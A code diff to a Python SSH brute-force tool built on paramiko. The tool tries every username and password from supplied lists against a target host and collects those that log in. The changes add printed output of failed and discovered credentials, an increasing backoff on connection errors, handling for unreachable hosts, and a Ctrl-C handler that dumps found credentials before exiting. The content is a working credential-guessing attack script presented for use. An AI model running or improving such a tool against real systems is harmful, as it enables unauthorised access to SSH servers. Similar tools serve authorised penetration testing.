@@ -3,12 +3,14 @@ import paramiko
 import time
 import argparse
 import logging
+import signal
+import sys
 
-from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException
+from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException, NoValidConnectionsError
 
 logging.basicConfig()
 logger = logging.getLogger(__name__)
-logger.setLevel(logging.DEBUG)
+logger.setLevel(logging.ERROR)
 
 
 class Engine(object):
@@ -43,6 +45,8 @@ class Engine(object):
         if self.pass_path:
             self.passlist = self.load_file(passfile)
 
+        signal.signal(signal.SIGINT, self.signal_handler)
+
     def load_file(self, filepath):
         """
         Helper function that loads a filepath and reads the contents.
@@ -53,11 +57,6 @@ class Engine(object):
         with open(filepath, 'r') as f:
             data = f.read().splitlines()
         return data
-
-    # def partition_list(self, p_list):
-    #     p_size = len(p_list) / self.num_pools
-    #     for i in xrange(0, len(p_list), p_size):
-    #         yield p_list[i:i+p_size]
 
     def init_ssh(self):
         """
@@ -70,12 +69,13 @@ class Engine(object):
 
     def execute(self):
 
-        self.start_time = time.clock()
+        self.start_time = time.time()
 
         ssh = self.init_ssh()
         successful = False
         max_conn_attempts = 5
         curr_conn_attempts = 0
+        wait_backoff = 1
 
         for user in self.userlist:
             for pw in self.passlist:
@@ -87,17 +87,24 @@ class Engine(object):
                         raise
                     except AuthenticationException:
                         logger.info('Failed: %s:%s' % (user, pw))
+                        print('Failed: %s:%s' % (user, pw))
                         successful = True
                     except SSHException:
                         ssh.close()
                         ssh = self.init_ssh()
-                        time.sleep(1)
+                        time.sleep(wait_backoff)
+                        wait_backoff += 1
                         if curr_conn_attempts >= max_conn_attempts:
                             logger.info('Could not connect to target: %s' % self.target)
+                            print('Could not connect to target: %s' % self.target)
                             return
+                    except NoValidConnectionsError:
+                        logger.error('Could not connect to target (%s)' % self.target)
+                        return
                     else:
                         creds = '%s:%s' % (user, pw)
                         logger.info('Discovered Credentials: %s' % creds)
+                        print('Discovered Credentials: %s' % creds)
                         self.credentials.append(creds)
                         successful = True
 
@@ -105,12 +112,19 @@ class Engine(object):
 
                 successful = False
                 curr_conn_attempts = 0
+                wait_backoff = 1
 
-        self.end_time = time.clock()
+        self.end_time = time.time()
         total = self.end_time - self.start_time
         logger.debug('\nTotal Execution Time: %s\n' % total)
 
-        logger.info('Discovered credentials: %s' % self.credentials)
+        print('Discovered credentials: %s' % self.credentials)
+
+    def signal_handler(self, signum, frame):
+        print('Caught signal. Exiting.')
+        logger.info('\nCaught signal. Exiting.')
+        print('Discovered credentials: %s' % self.credentials)
+        sys.exit(0)
 
 
 def main(ip_addr, userfile=None, req_time=0.0, passfile=None):
